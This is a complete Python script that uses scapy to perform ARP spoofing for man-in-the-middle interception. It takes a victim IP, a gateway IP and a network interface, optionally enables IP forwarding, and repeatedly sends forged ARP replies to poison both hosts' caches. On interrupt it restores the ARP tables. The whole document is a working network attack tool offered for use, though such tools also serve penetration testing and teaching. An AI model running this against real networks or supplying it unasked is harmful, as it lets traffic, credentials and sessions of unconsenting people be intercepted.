import time
import sys
import os
import argparse
from scapy.all import ARP, Ether, send, srp, get_if_hwaddr

def set_ip_forwarding(enable, verbose):

    forward_path = "/proc/sys/net/ipv4/ip_forward"
    value = '1' if enable else '0'
    action = "Enabling" if enable else "Disabling"

    if verbose:
        print(f"[{'+' if enable else '-'}] {action} IP forwarding ({forward_path} = {value})...")
    
    try:
        with open(forward_path, 'w') as f:
            f.write(value)
        if verbose:
             print("[+] IP forwarding configured.")
    except PermissionError:
        print(f"[!] Error: Permission denied to modify {forward_path}.")
        print("[!] Please run as root (sudo):")
        print(f"[!] sudo echo {value} > {forward_path}")
    except Exception as e:
        print(f"[!] Error while modifying IP forwarding: {e}")


def get_mac(ip, interface):

    if os.geteuid() != 0:
        print("[-] Error: This script must be run as root (sudo).")
        sys.exit(1)
        
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, iface=interface, timeout=1, retry=3, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[-] Could not find MAC address for {ip} on interface {interface}")
        sys.exit(1)

def arp_spoof(target_ip, spoof_ip, interface, verbose):
    
    target_mac = get_mac(target_ip, interface)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    if verbose:
        attacker_mac = get_if_hwaddr(interface)
        print(f"[*] Sending: {spoof_ip} is at {attacker_mac} -> to {target_ip} ({target_mac})")
    send(packet, iface=interface, verbose=False)

def restore_arp(destination_ip, source_ip, interface, verbose):
    if verbose:
        print(f"[*] Attempting to restore: {destination_ip}")
        
    destination_mac = get_mac(destination_ip, interface)
    source_mac = get_mac(source_ip, interface)
    
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    
    if verbose:
        print(f"[*] Sending restore: {source_ip} is at {source_mac} -> to {destination_ip} ({destination_mac})")
    send(packet, iface=interface, count=4, verbose=False)


def main():
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool for MitM.")
    parser.add_argument("victim_ip", help="IP address of the victim machine.")
    parser.add_argument("gateway_ip", help="IP address of the gateway/router.")
    parser.add_argument("interface", help="Network interface to use (e.g., eth0).")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode.")
    parser.add_argument("-f", "--forward", action="store_true", help="Automatically enable IP forwarding at start.")
    
    args = parser.parse_args()

    sent_packets_count = 0

    print("[*] Starting ARP spoofer")
    
    if args.forward:
        set_ip_forwarding(True, args.verbose)

    try:
        while True:
            arp_spoof(args.victim_ip, args.gateway_ip, args.interface, args.verbose)
            arp_spoof(args.gateway_ip, args.victim_ip, args.interface, args.verbose)
            sent_packets_count += 2
            print(f"\r[+] Packets sent: {sent_packets_count}", end="")
            sys.stdout.flush()
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C pressed.. Restoring ARP tables")
        restore_arp(args.victim_ip, args.gateway_ip, args.interface, args.verbose)
        restore_arp(args.gateway_ip, args.victim_ip, args.interface, args.verbose)
        if args.forward:
            set_ip_forwarding(False, args.verbose)
        
        print("[+] ARP tables restored. Exiting.")

if __name__ == "__main__":
    main()